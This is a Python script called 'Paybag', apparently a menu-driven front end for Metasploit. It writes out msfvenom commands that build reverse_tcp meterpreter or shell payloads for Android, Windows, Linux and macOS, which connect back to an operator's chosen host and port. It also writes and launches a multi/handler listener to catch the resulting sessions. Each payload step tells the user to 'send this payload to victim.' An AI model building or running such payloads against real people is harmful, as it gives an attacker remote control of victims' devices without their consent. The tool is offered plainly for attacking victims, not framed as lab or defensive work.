import os
import random
try:
    # Color code
    R='\033[91m'
    Y='\033[93m'
    G='\033[92m'
    CY='\033[96m'
    W='\033[97m'
    B='\033[95m'
    print(CY+"""
    ____              __               
   / __ \____ ___  __/ /_  ____ _____ _
  / /_/ / __ `/ / / / __ \/ __ `/ __ `/
 / ____/ /_/ / /_/ / /_/ / /_/ / /_/ / 
/_/    \__,_/\__, /_.___/\__,_/\__, /  
            /____/            /____/   
"""+Y+"""
           [--> v1.0 <--]"""+G+"""

>> Payload generator for Metasploit <<"""+CY+"""
      ---------------------------"""+B+"""
        Code By -> Deadpool2000""")
    def main():
        print(R+"""************************************************"""+CY+"""\n
>>> Main menu"""+Y+"""

1) Create a payload
2) Start handler
3) Launch Metasploit
4) Exit\n""")

    def osi():
        print(R+"""
************************************************"""+Y+"""
            
Select option to create payload\n"""+CY+"""
1) Android
2) Windows
3) Linux
4) Mac OS

99) Back to main menu\n""")

    def lst():
        print(R+"""
************************************************"""+Y+"""

Select option to create handler\n"""+CY+"""
1) Android
2) Windows
3) Linux
4) Mac OS

99) Back to main menu\n""")
    def mk():
        f=os.path.exists("payload")
        if f:
            print("")
        else:
            os.system("mkdir payload")
    def check():
        try:
            os.remove('msh.rc')
        except FileNotFoundError:
            print("")
    def check2():
        if os.path.isfile('/data/data/com.termux/files/usr/bin/bash')==False:
            if os.path.isfile('/usr/bin/msfconsole')==False:
                print(R+"""
************************************************\n"""
+Y+"\nmsfconsole not found ! Please install Meatsploit-Framework properly and try again :( \n"+W)
                exit(0)
    def ch3():
        if os.path.isfile('/data/data/com.termux/files/usr/bin/bash')==True:
            if os.path.isfile('/data/data/com.termux/files/usr/bin/msfvenom')==False:
                print(R+"""
************************************************\n"""
+Y+"""\nmsfconsole and msfvenom not found in '/data/data/com.termux/files/usr/bin/'\n""")
                p=input(CY+"Install Metasploit in Termux ?"+G+" (y/n)"+R+" >>> "+W)
                if p=="y":
                    os.system("apt install unstable-repo -y")
                    os.system("apt update && apt install metasploit -y")
                elif p=="n":
                    print(Y+"\nExit.........! Have a nice day :) ")
                    print(R+"\n------------"+CY+" Code by:"+G+" Deadpool2000"+R+" ------------"+W)
                    print(R+"------------"+CY+" Youtube:"+G+" https://bit.ly/2HnPZd2"+R+" ------------\n"+W)
                    exit(0)                
                else:
                    print(R+"\nInvalid choice ! Leaving.......\n"+W)
                    exit(0)
    def sel():
        try:
            c=int(input(G+"Select your choice >>"+W+" "))
            # Create payload
            if c==1:
                def sel1():
                    try:
                        ch=int(input(G+"Select your choice >>"+W+" "))
                        if ch==1:
                            lh=input(CY+"\nEnter LHOST:"+W+" ")
                            lp=int(input(CY+"Enter LPORT:"+W+" "))
                            print(B+"\nGenerating payload..........\n")
                            a=random.randint(1,99)
                            st1="android_"+str(a)+".apk"
                            st="msfvenom -p android/meterpreter/reverse_tcp lhost="+str(lh)+" lport="+str(lp)+" R > payload/"+st1
                            os.system(st)
                            print(R+"\n>>>"+G+" Payload saved as ("+Y+st1+G+") in 'payload' folder"+R+" <<<\n")
                            print(CY+"Now send this payload to victim. Then start 'handler' from main menu\n")
                            osi()
                            sel1()
                        elif ch==2:
                            lh=input(CY+"\nEnter LHOST:"+W+" ")
                            lp=int(input(CY+"Enter LPORT:"+W+" "))
                            print(B+"\nGenerating payload..........\n")
                            a=random.randint(1,99)
                            st1="win_"+str(a)+".exe"
                            st="msfvenom -p windows/meterpreter/reverse_tcp lhost="+str(lh)+" lport="+str(lp)+" R > payload/"+st1
                            os.system(st)
                            print(R+"\n>>>"+G+" Payload saved as ("+Y+st1+G+") in 'payload' folder"+R+" <<<\n")
                            print(CY+"Now send this payload to victim. Then start 'handler' from main menu\n")
                            osi()
                            sel1()
                        elif ch==3:
                            lh=input(CY+"\nEnter LHOST:"+W+" ")
                            lp=int(input(CY+"Enter LPORT:"+W+" "))
                            print(B+"\nGenerating payload..........\n")
                            a=random.randint(1,99)
                            st1="linux_"+str(a)+".elf"
                            st="msfvenom -p linux/x86/meterpreter/reverse_tcp lhost="+str(lh)+" lport="+str(lp)+" R > payload/"+st1
                            os.system(st)
                            print(R+"\n>>>"+G+" Payload saved as ("+Y+st1+G+") in 'payload' folder"+R+" <<<\n")
                            print(CY+"Now send this payload to victim. Then start 'handler' from main menu\n")
                            osi()
                            sel1()
                        elif ch==4:
                            lh=input(CY+"\nEnter LHOST:"+W+" ")
                            lp=int(input(CY+"Enter LPORT:"+W+" "))
                            print(B+"\nGenerating payload..........\n")
                            a=random.randint(1,99)
                            st1="macos_"+str(a)+".macho"
                            st="msfvenom -p osx/x86/shell_reverse_tcp lhost="+str(lh)+" lport="+str(lp)+" R > payload/"+st1
                            os.system(st)
                            print(R+"\n>>>"+G+" Payload saved as ("+Y+st1+G+") in 'payload' folder"+R+" <<<\n")
                            print(CY+"Now send this payload to victim. Then start 'handler' from main menu\n")
                            osi()
                            sel1()
                        elif ch==99:
                            main()
                            sel()
                        else:
                            print(R+"\nInvalid Choice! Please try again\n")
                            osi()
                            sel1()
                    except ValueError:
                        print(R+"\nInvalid input ! Please try again !\n")
                        sel1()
                osi()
                sel1()
            elif c==2:
                # Creating handler
                def sel2():
                    try:
                        ch=int(input(G+"Select your choice >>"+W+" "))
                        if ch==1:
                            pr=os.path.isfile("msh.rc")
                            if pr:
                                try:
                                    os.remove('msh.rc')
                                except FileNotFoundError:
                                    print("")
                            else:                
                                lh=input(CY+"\nEnter LHOST:"+W+" ")
                                lp=int(input(CY+"Enter LPORT:"+W+" "))
                                f=open("msh.rc","w+")
                                l1="use exploit/multi/handler"
                                l2="set PAYLOAD android/meterpreter/reverse_tcp"
                                l3="set LHOST "+str(lh)
                                l4="set LPORT "+str(lp)
                                l5="set ExitOnSession false"
                                l6="exploit -j -z"
                                f.write("%s\n%s\n%s\n%s\n%s\n%s\n" %(l1,l2,l3,l4,l5,l6))
                                f.close()
                            os.system('clear')
                            print(Y+"\nStarting handler...............\n"+W)
                            os.system("msfconsole -r msh.rc")
                            os.remove('msh.rc')
                            os.system("clear")                      
                            lst()
                            sel2()
                        elif ch==2:
                            pr=os.path.isfile('msh.rc')
                            if pr:
                                try:
                                    os.remove('msh.rc')
                                except FileNotFoundError:
                                    print("")
                            else:                
                                lh=input(CY+"\nEnter LHOST:"+W+" ")
                                lp=int(input(CY+"Enter LPORT:"+W+" "))
                                f=open("msh.rc","w+")
                                l1="use exploit/multi/handler"
                                l2="set PAYLOAD windows/meterpreter/reverse_tcp"
                                l3="set LHOST "+str(lh)
                                l4="set LPORT "+str(lp)
                                l5="set ExitOnSession false"
                                l6="exploit -j -z"
                                f.write("%s\n%s\n%s\n%s\n%s\n%s\n" %(l1,l2,l3,l4,l5,l6))
                                f.close()
                            os.system('clear')
                            print(Y+"\nStarting handler...............\n"+W)
                            os.system("msfconsole -r msh.rc")
                            os.remove('msh.rc')
                            os.system('clear')
                            lst()
                            sel2()
                        elif ch==3:
                            pr=os.path.isfile('msh.rc')
                            if pr:
                                try:
                                    os.remove('msh.rc')
                                except FileNotFoundError:
                                    print("")
                            else:                
                                lh=input(CY+"\nEnter LHOST:"+W+" ")
                                lp=int(input(CY+"Enter LPORT:"+W+" "))
                                f=open("msh.rc","w+")
                                l1="use exploit/multi/handler"
                                l2="set PAYLOAD linux/x86/meterpreter/reverse_tcp"
                                l3="set LHOST "+str(lh)
                                l4="set LPORT "+str(lp)
                                l5="set ExitOnSession false"
                                l6="exploit -j -z"
                                f.write("%s\n%s\n%s\n%s\n%s\n%s\n" %(l1,l2,l3,l4,l5,l6))
                                f.close()
                            os.system('clear')
                            print(Y+"\nStarting handler...............\n"+W)
                            os.system("msfconsole -r msh.rc")
                            os.remove('msh.rc')
                            os.system('clear')
                            lst()
                            sel2()
                        elif ch==4:
                            pr=os.path.isfile('msh.rc')
                            if pr:
                                try:
                                    os.remove('msh.rc')
                                except FileNotFoundError:
                                    print("")
                            else:                
                                lh=input(CY+"\nEnter LHOST:"+W+" ")
                                lp=int(input(CY+"Enter LPORT:"+W+" "))
                                f=open("msh.rc","w+")
                                l1="use exploit/multi/handler"
                                l2="set PAYLOAD osx/x86/shell_reverse_tcp"
                                l3="set LHOST "+str(lh)
                                l4="set LPORT "+str(lp)
                                l5="set ExitOnSession false"
                                l6="exploit -j -z"
                                f.write("%s\n%s\n%s\n%s\n%s\n%s\n" %(l1,l2,l3,l4,l5,l6))
                                f.close()
                            os.system('clear')
                            print(Y+"\nStarting handler...............\n"+W)
                            os.system("msfconsole -r msh.rc")
                            os.remove('msh.rc')
                            os.system('clear')
                            lst()
                            sel2()
                        elif ch==99:
                            try:
                                os.remove('msh.rc')
                            except FileNotFoundError:
                                print("")
                            main()
                            sel()
                        else:
                            try:
                                os.remove('msh.rc')
                            except FileNotFoundError:
                                print("")
                            print(R+"\nInvalid choice! Please try again\n")
                            lst()
                            sel2()
                    except ValueError:
                        print(R+"\nInvalid input ! Please try again !\n")
                        sel2()
                lst()
                sel2()
            elif c==3:
                # Launching msfconsole
                os.system('clear')
                print(Y+"\nLaunching msfconsole..................\n\n"+W)
                os.system("msfconsole")
                os.system('clear')
                main()
                sel()
            elif c==4:
                try:
                    os.remove('msh.rc')
                except FileNotFoundError:
                    print("")
                print(Y+"\nExit.........! Have a nice day :) ")
                print(R+"\n------------"+CY+" Code by:"+G+" Deadpool2000"+R+" ------------"+W)
                print(R+"------------"+CY+" Youtube:"+G+" https://bit.ly/2HnPZd2"+R+" ------------\n"+W)

            else:
                print(R+"\nInvalid choice ! Please try again :(\n")
                try:
                    os.remove('msh.rc')
                except FileNotFoundError:
                    print("")
                main()                
                sel()
        except ValueError:
            print(R+"\nInvalid input ! Please try again!\n")
            sel()
    #call
    mk()
    check()
    check2()
    ch3()
    main()                
    sel()
except KeyboardInterrupt:
    try:
        os.remove('msh.rc')
    except FileNotFoundError:
        print("")
    print(CY+"""\n
************************************************"""+G+
"\n\n>>> "+R+"Interrupted!"+Y+" Exiting.........\n"+W)
    print(R+"\n------------"+CY+" Code by:"+G+" Deadpool2000"+R+" ------------"+W)
    print(R+"------------"+CY+" Youtube:"+G+" https://bit.ly/2HnPZd2"+R+" ------------\n"+W)
